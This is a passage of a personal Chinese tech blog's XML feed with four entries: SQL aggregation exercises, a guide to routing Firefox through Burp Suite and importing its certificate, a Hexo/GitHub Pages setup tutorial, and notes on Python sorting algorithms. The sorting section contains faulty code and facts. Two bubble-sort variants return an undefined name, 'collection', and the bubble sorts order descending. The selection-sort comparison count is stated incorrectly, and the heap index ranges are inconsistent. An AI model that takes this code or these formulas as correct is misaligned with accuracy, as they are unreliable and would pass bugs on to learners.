director</span><br></pre></td></tr></table></figure></li><li><p>按导演分组计算销售总额,求出平均销售额冠军（统计结果过滤掉只有单部电影的导演，列出导演名，总销量，电影数量，平均销量)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> director,<span class="keyword">sum</span>(Domestic_sales+International_sales)<span class="keyword">as</span> sales,<span class="keyword">count</span>(director),<span class="keyword">sum</span>(Domestic_sales+International_sales)/<span class="keyword">count</span>(director) <span class="keyword">as</span> avgsales</span><br><span class="line"><span class="keyword">FROM</span> movies <span class="keyword">as</span> m</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> Boxoffice <span class="keyword">as</span> b</span><br><span class="line"><span class="keyword">on</span> b.movie_id=m.id</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> director</span><br><span class="line"><span class="keyword">having</span> <span class="keyword">count</span>(Director)&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> Avgsales <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>找出每部电影和单部电影销售冠军之间的销售差，列出电影名，销售额差额</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title,(<span class="keyword">select</span> <span class="keyword">max</span>(Domestic_sales+International_sales) <span class="keyword">from</span> Boxoffice)-(Domestic_sales+International_sales) <span class="keyword">as</span> sales</span><br><span class="line"><span class="keyword">FROM</span> movies <span class="keyword">as</span> m</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> Boxoffice <span class="keyword">as</span> b</span><br><span class="line"><span class="keyword">on</span> b.movie_id=m.id</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sql-wp&quot;&gt;&lt;a href=&quot;#sql-wp&quot; class=&quot;headerlink&quot; title=&quot;sql wp&quot;&gt;&lt;/a&gt;sql wp&lt;/h1&gt;&lt;h2 id=&quot;网址&quot;&gt;&lt;a href=&quot;#网址&quot; class=&quot;headerlink&quot; title=&quot;网址&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="sql" scheme="https://mercer5.github.io/categories/sql/"/>
    
    
      <category term="sql" scheme="https://mercer5.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>burpsuit 试水</title>
    <link href="https://mercer5.github.io/2020/02/12/bp-%E8%AF%95%E6%B0%B4/"/>
    <id>https://mercer5.github.io/2020/02/12/bp-%E8%AF%95%E6%B0%B4/</id>
    <published>2020-02-12T13:32:51.000Z</published>
    <updated>2020-08-24T15:30:09.736Z</updated>
    
    <content type="html"><![CDATA[<h1 id="burpsuit-试水"><a href="#burpsuit-试水" class="headerlink" title="burpsuit 试水"></a>burpsuit 试水</h1><h2 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h2><ol><li>kali</li><li>firefox esr</li><li>burpsuit</li></ol><h2 id="不必要的准备"><a href="#不必要的准备" class="headerlink" title="不必要的准备"></a>不必要的准备</h2><p>以上设备都是kali自带的</p><p>然后我把火狐设置成中文了(英语渣伤不起啊啊啊啊)</p><p>以下是设置成中文的步骤</p><ol><li><p>终端执行:<code>sudo apt -y install firefox-esr-l10n-zh-cn</code></p></li><li><p>设置首选项</p><img src="00822enrly1gbtx6gzl5hj30be0mhwg8.jpg" alt="Snipaste_2020-02-12_21-01-36.png" style="zoom:67%;" /></li><li><p>语言选项</p><img src="00822enrly1gbtx6zf6kcj30rq077jrs.jpg" alt="Snipaste_2020-02-12_21-02-53.png" style="zoom:67%;" /></li><li><p>选择语言</p><img src="00822enrly1gbtx798ju0j30jb0990t8.jpg" alt="Snipaste_2020-02-12_21-03-28.png" style="zoom:67%;" /></li><li><p>加入并确认</p><img src="00822enrly1gbtx7pzid9j30j509hgm3.jpg" alt="Snipaste_2020-02-12_21-04-05.png" style="zoom:67%;" /></li></ol><h2 id="设置代理及证书"><a href="#设置代理及证书" class="headerlink" title="设置代理及证书"></a>设置代理及证书</h2><ol><li><p>菜单-&gt;首选项-&gt;常规-&gt;拉到最下面-&gt;网络设置</p><img src="00822enrly1gbtxlbobp7j30pv0j2768.jpg" alt="Snipaste_2020-02-12_21-09-50.png" style="zoom:67%;" /></li><li><p>设置代理</p><img src="00822enrly1gbtxlp4s27j30ly0a3gmq.jpg" alt="Snipaste_2020-02-12_21-10-37.png" style="zoom:67%;" /></li><li><p>打开bp</p></li><li><p>在火狐中输入:<a href="http://burp/" target="_blank" rel="noopener">http://burp/</a>       <strong>必须先打开bp</strong></p></li><li><p>下载</p><img src="00822enrly1gbtxlwyuqwj30n203ojrf.jpg" alt="Snipaste_2020-02-12_21-15-28.png" style="zoom:67%;" /></li><li><p>保存</p><img src="00822enrly1gbtxmfkusgj30dy0ahdgk.jpg" alt="Snipaste_2020-02-12_21-16-10.png" style="zoom:67%;" /></li><li><p>在查看证书中确认</p><img src="00822enrly1gbtxmpddtpj30m50d475n.jpg" alt="Snipaste_2020-02-12_21-17-28.png" style="zoom:67%;" /></li><li><p>导入,选中下载的文件,全点信任,ojbk</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;burpsuit-试水&quot;&gt;&lt;a href=&quot;#burpsuit-试水&quot; class=&quot;headerlink&quot; title=&quot;burpsuit 试水&quot;&gt;&lt;/a&gt;burpsuit 试水&lt;/h1&gt;&lt;h2 id=&quot;设备&quot;&gt;&lt;a href=&quot;#设备&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="web" scheme="https://mercer5.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://mercer5.github.io/tags/web/"/>
    
      <category term="burp" scheme="https://mercer5.github.io/tags/burp/"/>
    
  </entry>
  
  <entry>
    <title>如何搭建blog</title>
    <link href="https://mercer5.github.io/2020/02/10/%E6%90%AD%E5%BB%BAblog-github/"/>
    <id>https://mercer5.github.io/2020/02/10/%E6%90%AD%E5%BB%BAblog-github/</id>
    <published>2020-02-10T09:15:51.000Z</published>
    <updated>2020-08-24T15:30:09.847Z</updated>
    
    <content type="html"><![CDATA[<h1 id="如何搭建blog"><a href="#如何搭建blog" class="headerlink" title="如何搭建blog"></a>如何搭建blog</h1><h2 id="使用软件"><a href="#使用软件" class="headerlink" title="使用软件"></a>使用软件</h2><p><strong>本人系统win10</strong></p><p>Node.js,Git,hexo,sublimetext.</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Hexo 基于 Node.js，搭建过程中还需要使用 npm（Node.js 已带） 和 git</p><p>因此先搭建本地操作环境，安装 Node.js 和 Git。</p><ul><li>Node.js:<a href="https://nodejs.org/zh-cn/" target="_blank" rel="noopener">https://nodejs.org/zh-cn/</a></li><li>Git:<a href="https://git-scm.com/download/win" target="_blank" rel="noopener">https://git-scm.com/download/win</a></li></ul><p>一路点击<strong>下一步</strong></p><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><p>Win+R 输入 cmd </p><p>输入 node -v</p><p>输入npm -v</p><p>输入git –version </p><p>若分别出现各自的版本号,就ok了.如图</p><p><img src="1.jpg" alt="1"></p><h2 id="连接github"><a href="#连接github" class="headerlink" title="连接github"></a>连接github</h2><h3 id="注册github"><a href="#注册github" class="headerlink" title="注册github:"></a>注册github:</h3><p>要想连接github,首先你要有: )</p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><ul><li>打开git bash</li><li>设置用户名和邮箱</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--global user.name <span class="string">"GitHub 用户名"</span></span><br><span class="line">git<span class="built_in"> config </span>--global user.email <span class="string">"GitHub 邮箱"</span></span><br></pre></td></tr></table></figure><ul><li>创建ssh密钥</li></ul><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -<span class="built_in">t</span> rsa -C <span class="string">"GitHub 邮箱"</span>           (一路回车就行)</span><br></pre></td></tr></table></figure><p><img src="2.jpg" alt="2"></p><ul><li>添加密钥</li></ul><p>进入<strong>上图划绿线</strong>的目录，用<strong>记事本</strong>打开公钥<strong>id_rsa.pub</strong>文件并复制里面的内容。</p><p>登陆 GitHub ，进入 Settings 页面，选择左边栏的 SSH and GPG keys，点击 New SSH key。</p><p>Title 随便取个名字，粘贴复制的 id_rsa.pub 内容到 Key 中，点击 Add SSH key 完成添加。</p><h2 id="创建github-pages-仓库"><a href="#创建github-pages-仓库" class="headerlink" title="创建github pages 仓库"></a>创建github pages 仓库</h2><ol><li>GitHub 主页右上角加号 -&gt; New repository：</li></ol><ul><li>Repository name 中输入<strong>用户名.github.io</strong></li><li><strong>勾选</strong> “Initialize this repository with a README”</li><li>Description <strong>选填</strong></li></ul><ol start="2"><li>填好后点击 Create repository 创建。</li></ol><p><img src="3.jpg" alt="3"></p><p><img src="4.jpg" alt="4"></p><ol start="3"><li>创建后默认自动启用 HTTPS，博客地址为：<strong>https://用户名.github.io</strong></li></ol><h2 id="本地安装-Hexo-博客程序"><a href="#本地安装-Hexo-博客程序" class="headerlink" title="本地安装 Hexo 博客程序"></a>本地安装 Hexo 博客程序</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><ul><li><p>打开git bash</p></li><li><p>使用 npm 一键安装 Hexo 博客程序：</p></li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-<span class="keyword">cli</span> -g</span><br></pre></td></tr></table></figure><h3 id="hexo-初始化和本地浏览"><a href="#hexo-初始化和本地浏览" class="headerlink" title="hexo 初始化和本地浏览"></a>hexo 初始化和本地浏览</h3><ul><li>初始化并安装所需组件</li></ul><p>win + R,     cmd,       回车</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init 博客名      <span class="comment"># 初始化</span></span><br><span class="line"><span class="built_in">cd</span> 博客名             <span class="comment"># 进入目录</span></span><br><span class="line">npm install          <span class="comment"># 安装组件</span></span><br></pre></td></tr></table></figure><ul><li>启动本地程序并浏览</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo</span> g   <span class="comment"># 生成页面</span></span><br><span class="line">hexo s   <span class="comment"># 启动预览</span></span><br></pre></td></tr></table></figure><p>浏览器中访问 <code>http://localhost:4000</code>，出现 Hexo 默认页面，本地博客安装成功！</p><h2 id="部署-Hexo-到-GitHub-Pages"><a href="#部署-Hexo-到-GitHub-Pages" class="headerlink" title="部署 Hexo 到 GitHub Pages"></a>部署 Hexo 到 GitHub Pages</h2><h3 id="Sublime-Text"><a href="#Sublime-Text" class="headerlink" title="Sublime Text"></a>Sublime Text</h3><ol><li>安装</li></ol><ul><li>Sublime Text:<a href="https://www.sublimetext.com/3" target="_blank" rel="noopener">https://www.sublimetext.com/3</a></li><li>一路回车</li></ul><ol start="2"><li>使用</li></ol><ul><li>打开后将blog所在文件夹往里面拖即可</li></ul><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><ol><li>安装 hexo-deployer-git：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> hexo-deployer-git <span class="comment">--save</span></span><br></pre></td></tr></table></figure><ol start="2"><li>在Sublime Text中改些配置</li></ol><ul><li><strong>修改 _config.yml</strong> 文件末尾的 Deployment 部分</li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deploy</span>:</span><br><span class="line">  <span class="attribute">type</span>: git</span><br><span class="line">  <span class="attribute">repo</span>: git<span class="variable">@github</span>.<span class="attribute">com</span>:用户名/用户名.github.io.git</span><br><span class="line">  <span class="attribute">branch</span>: master</span><br></pre></td></tr></table></figure><p>repo可在github仓库直接复制</p><p><img src="5.jpg" alt="5"></p><ul><li><strong>修改 _config.yml</strong> 文件开头的 url 部分,改为自己blog地址</li></ul><p><img src="6.jpg" alt="6"></p><ul><li><p><strong>修改 _config.yml</strong> 文件开头的 site 部分</p><p>搜索关键词Site，如下：</p></li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Site</span></span><br><span class="line"><span class="symbol">title:</span> Chloneda             <span class="meta">#你的站点标题</span></span><br><span class="line"><span class="symbol">subtitle:</span> Less is more</span><br><span class="line"><span class="symbol">description:</span> Less is more   <span class="meta">#你的站点描述</span></span><br><span class="line"><span class="symbol">keywords:</span> chloneda</span><br><span class="line"><span class="symbol">author:</span> chloneda            <span class="meta">#站点作者</span></span><br></pre></td></tr></table></figure><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><p>传到github上</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo d</span></span><br></pre></td></tr></table></figure><h3 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h3><p>在浏览器中输入github域名<code>https://用户名.github.io</code>,就可以看到hexo网站了.</p><h2 id="next"><a href="#next" class="headerlink" title="next"></a>next</h2><ol><li><p>下载主题</p></li><li><p>将主题文件拷贝至站点目录的 <code>themes</code> 目录</p></li><li><p>打开 <strong>站点配置文件</strong>， 找到 <code>theme</code> 字段，并将其值更改为 <code>next</code>(就可以使用该主题了)</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: https:<span class="comment">//hexo.io/plugins/</span></span><br><span class="line">## Themes: https:<span class="comment">//hexo.io/themes/</span></span><br><span class="line">theme: next</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;如何搭建blog&quot;&gt;&lt;a href=&quot;#如何搭建blog&quot; class=&quot;headerlink&quot; title=&quot;如何搭建blog&quot;&gt;&lt;/a&gt;如何搭建blog&lt;/h1&gt;&lt;h2 id=&quot;使用软件&quot;&gt;&lt;a href=&quot;#使用软件&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="blog" scheme="https://mercer5.github.io/categories/blog/"/>
    
    
      <category term="blog" scheme="https://mercer5.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>python排序算法集合</title>
    <link href="https://mercer5.github.io/2019/12/20/python-%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
    <id>https://mercer5.github.io/2019/12/20/python-%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</id>
    <published>2019-12-20T11:35:51.000Z</published>
    <updated>2020-08-24T15:30:09.747Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python-排序算法"><a href="#python-排序算法" class="headerlink" title="python 排序算法"></a>python 排序算法</h1><h2 id="0-相关知识"><a href="#0-相关知识" class="headerlink" title="0.相关知识"></a>0.相关知识</h2><p><strong>内部排序</strong></p><p>若整个排序过程不需要访问外存便能完成，则称此类排序问题为内部排序。</p><p><strong>外部排序</strong></p><p>若参加排序的记录数量很大，整个序列的排序过程不可能在内存中完成，则称此类排序问题为外部排序。</p><p><strong>就地排序</strong></p><p>若排序算法所需的辅助空间并不依赖于问题的规模n，即辅助空间为O（1），称为就地排序。</p><p><strong>稳定排序</strong></p><p>假定在待排序的记录序列中，存在多个具有相同的关键字的记录，若经过排序后，这些记录的相对次序保持不变，即在原序列中 ri=rj， ri 在 rj 之前，而在排序后的序列中，ri 仍在 rj 之前，则称这种排序算法是稳定的；否则称为不稳定的。</p><p><strong>排序序列分布</strong></p><p>排序需要考虑待排序关键字的分布情况，这会影响对排序算法的选择，通常我们在分析下列算法时都考虑关键字分布是随机分布的，不是按照某种规律分布的，比如正态分布等。</p><p><strong>待排序序列</strong></p><p>排序序列中，剩余即将要排序的序列部分。</p><p><strong>已排序序列</strong></p><p>排序序列中，已经排序好的序列部分。</p><p><strong>哨兵</strong></p><p>一切为简化边界条件而引入的附加结点(元素)均可称为哨兵</p><h2 id="1-冒泡排序"><a href="#1-冒泡排序" class="headerlink" title="1.冒泡排序"></a>1.冒泡排序</h2><p><strong>步骤</strong></p><ol><li>比较相邻的元素。如果第一个比第二个大，就交换他们两个。</li><li>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。</li><li>针对所有的元素重复以上的步骤，除了最后一个。</li><li>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</li></ol><p><strong>比较次数</strong></p><p>n * (n-1) / 2 </p><p><strong>算法评价</strong></p><p>优点：如果你不是故意去交换相等的关键码的话，这个算法是绝对稳定的排序算法。</p><p>缺点：比较次数也就是所谓的时间复杂度 为O(n^2^)，最好的情况和最坏的情况都是O(n^2^)。</p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubbleSort</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(arr)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(arr)-i):</span><br><span class="line">            <span class="keyword">if</span> arr[j]&lt;arr[j+<span class="number">1</span>]:</span><br><span class="line">                arr[j], arr[j + <span class="number">1</span>] = arr[j + <span class="number">1</span>], arr[j]</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><p><strong>优化代码1</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble_sort1</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    如果没有元素交换，说明数据在排序过程中已经有序，直接退出循环</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(arr)):</span><br><span class="line">        swapped = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(arr)-i):</span><br><span class="line">            <span class="keyword">if</span> arr[j]&lt;arr[j+<span class="number">1</span>]:</span><br><span class="line">                swapped = <span class="literal">True</span></span><br><span class="line">                arr[j], arr[j + <span class="number">1</span>] = arr[j + <span class="number">1</span>], arr[j]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> swapped: </span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># Stop iteration if the collection is sorted.</span></span><br><span class="line">    <span class="keyword">return</span> collection</span><br></pre></td></tr></table></figure><p><strong>优化代码2</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble_sort2</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    bubble_sort1的基础上再优化。</span></span><br><span class="line"><span class="string">    优化思路：在排序的过程中，数据可以从中间分为两段，一段是无序状态，另一段是有序状态。</span></span><br><span class="line"><span class="string">    每一次循环的过程中，记录最后一个交换元素的index，它便是有序和无序状态的边界</span></span><br><span class="line"><span class="string">    下一次仅循环到边界即可，从而减少循环次数，达到优化。</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    compare_count=<span class="number">0</span></span><br><span class="line">    last_change_index = <span class="number">0</span> <span class="comment">#最后一个交换的位置</span></span><br><span class="line">    border = len(arr)<span class="number">-1</span> <span class="comment">#有序和无序的分界线</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(arr)):</span><br><span class="line">        swapped = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(border):</span><br><span class="line">            <span class="keyword">if</span> arr[j]&lt;arr[j+<span class="number">1</span>]:</span><br><span class="line">                swapped = <span class="literal">True</span></span><br><span class="line">                arr[j], arr[j + <span class="number">1</span>] = arr[j + <span class="number">1</span>], arr[j]</span><br><span class="line">                last_change_index = j</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> swapped: </span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># Stop iteration if the collection is sorted.</span></span><br><span class="line">        border = last_change_index <span class="comment"># 最后一个交换的位置就是边界</span></span><br><span class="line">    <span class="keyword">return</span> collection</span><br></pre></td></tr></table></figure><h2 id="2-快速排序"><a href="#2-快速排序" class="headerlink" title="2.快速排序"></a>2.快速排序</h2><p><strong>简介</strong></p><p>快速排序是由东尼·霍尔所发展的一种排序算法。在平均状况下，排序 n 个项目要 Ο(nlogn) 次比较。在最坏状况下则需要 Ο(n2) 次比较，但这种状况并不常见。事实上，快速排序通常明显比其他 Ο(nlogn) 算法更快，因为它的内部循环（inner loop）可以在大部分的架构上很有效率地被实现出来。</p><p>快速排序使用分治法（Divide and conquer）策略来把一个串行（list）分为两个子串行（sub-lists）。</p><p>快速排序又是一种分而治之思想在排序算法上的典型应用。本质上来看，快速排序应该算是在冒泡排序基础上的递归分治法。</p><p><strong>步骤</strong></p><ol><li>从数列中挑出一个元素，称为 “基准”（pivot）;</li><li>重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；</li><li>递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序；</li></ol><p>递归的最底部情形，是数列的大小是零或一，也就是永远都已经被排序好了。虽然一直递归下去，但是这个算法总会退出，因为在每次的迭代（iteration）中，它至少会把一个元素摆到它最后的位置去。</p><p><strong>代码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def quicksort(array):</span><br><span class="line">    if len(array)&lt;2:</span><br><span class="line">        return array#基线条件：为空或者只包含一个元素的数组是有序的</span><br><span class="line">    else:</span><br><span class="line">        pivot&#x3D;array[0]#基准值</span><br><span class="line">        less&#x3D;[i for i in array[1:] if i&lt;&#x3D;pivot]#由小于基准值的数构成的子数列</span><br><span class="line">        more&#x3D;[i for i in array[1:] if i&gt;pivot]#由大于基准值的数构成的子数列</span><br><span class="line">        return quicksort(less)+[pivot]+quicksort(more)</span><br></pre></td></tr></table></figure><p><strong>简单评价</strong></p><ol><li>最坏情况</li></ol><p>快速排序的最坏情况，实际上就退化为了冒泡排序的情况，想想冒泡排序，每一轮比较后，都将原来的排序好的区间增加了一个长度，也就是说快速排序每次选择的pivot也正好达成了冒泡排序的作用，那么最坏情况就此发生。简单来说，最坏情况发生在每次划分过程产生的两个区间分别包含n-1个元素和1个元素的时候。那么不难知道，最坏情况的复杂度也为 O(n^2)。</p><ol start="2"><li>最好情况</li></ol><p>如果每次划分过程产生的区间大小都为n/2，则快速排序法运行就快得多了，此时的时间复杂度为 <strong>O（nlogn）</strong>，logn表示以2为底，n的对数。因为每轮比较都会平均分成2个区间，共经过趋向于n轮的比较。</p><ol start="3"><li>平均情况</li></ol><p>平均情况和最好情况的时间复杂度都为<strong>O（nlogn）</strong>，只不过平均情况的常数因子可能大一些，有关详细分析，请查阅相关资料。</p><h2 id="3-选择排序"><a href="#3-选择排序" class="headerlink" title="3.选择排序"></a>3.选择排序</h2><p><strong>步骤</strong></p><ol><li>首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置</li><li>再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。</li><li>重复第二步，直到所有元素均排序完毕。</li></ol><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selectionSort</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr) - <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 记录最小数的索引</span></span><br><span class="line">        minIndex = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, len(arr)):</span><br><span class="line">            <span class="keyword">if</span> arr[j] &lt; arr[minIndex]:</span><br><span class="line">                minIndex = j</span><br><span class="line">        <span class="comment"># i 不是最小数时，将 i 和最小数进行交换</span></span><br><span class="line">        <span class="keyword">if</span> i != minIndex:</span><br><span class="line">            arr[i], arr[minIndex] = arr[minIndex], arr[i]</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><p><strong>算法评价</strong></p><p>在直接选择排序中，共需要进行 n-1 轮，每轮必发生一次交换，每轮需要进行 n-i 次比较 (1&lt;=i&lt;=n-1)，总的比较次数等于 </p><p>(n-1) + (n-2) + … + ( n-(n-1) ) </p><p>化简后等于 n + (n-1)(n-2)/2</p><p>由此可知，直接选择排序的时间复杂度为 O(n^2) ，空间复杂度为 O(1) 。注意到，直接选择排序在最好和最坏情况下都是 O(n^2) 。</p><p>一般地，排序算法的时间复杂度为 O(n^2)是不令人满意的排序算法，在选择排序算法的思想下，有一种选择排序算法提升了时间性能，它就是==堆排序==</p><h2 id="4-堆排序"><a href="#4-堆排序" class="headerlink" title="4.堆排序"></a>4.堆排序</h2><p><strong>简介</strong></p><p>堆排序，英文名称 Heapsort，利用二叉树（堆）这种数据结构所设计的一种排序算法，是一种对直接选择排序的一种改建算法。在逻辑结构上是按照二叉树存储结构，正是这种结构优化了选择排序的性能，在物理存储上是连续的数组存储，它利用了数组的特点快速定位指定索引的元素。</p><p><strong>堆排序的基本概念</strong></p><p>n个关键字序列 Kl，K2，…，Kn 称为堆（Heap），当且仅当该序列满足如下性质：</p><ul><li><p>Ki &lt;= K( 2i + 1 ）且 Ki &lt;= K( 2i + 2 ) ( 0≤i≤ (n/2)-1），称为小根堆。每个节点的值都小于或等于其子节点的值，在堆排序算法中用于降序排列</p></li><li><p>Ki &gt;= K( 2i + 1） 且 Ki &gt;= K( 2i +2 ) ( 1≤i≤ (n/2)-1）， 称为大根堆。每个节点的值都大于或等于其子节点的值，在堆排序算法中用于升序排列</p></li></ul><p><strong>堆排序是如何工作的</strong></p><p>以大根堆排序为例，即要得到非降序序列。</p><ol><li>先将初始文件R[0..n-1]建成一个大根堆，此堆为初始的无序区。</li><li>再将关键字最大的记录R[0]（即堆顶）和无序区的最后一个记录R[n-1]交换，由此得到新的无序区 R[0..n-2] 和有序区 R[n-1]，且满足 R[0..n-2] ≤ R[n-1]</li><li>由于交换后新的根R[0]可能违反堆性质，故应将当前无序区R[0..n-2]调整为堆。然后再次将R[0..n-2]中关键字最大的记录R[0]和该区间的最后一个记录R[n-2]交换，由此得到新的无序区R[0..n-3] 和 有序区R[n-2..n-1]，且仍满足关系R[0..n-3] ≤ R[n-2..n-1]。</li><li>重复步骤2和步骤3，直到无序区只有一个元素为止。</li></ol><p><strong>步骤</strong></p><ol><li>创建一个堆 H[0……n-1]；</li><li>把堆首（最大值）和堆尾互换；</li><li>把堆的尺寸缩小 1，并调用 shift_down(0)，目的是把新的数组顶端数据调整到相应位置；</li><li>重复步骤 2，直到堆的尺寸为 1。</li></ol><p><strong>例子:如何构建大根堆</strong></p><p>3,2,5,9,2</p><ol><li>待排序列的物理存储结构和逻辑存储结构的示意图如下所示，</li></ol><img 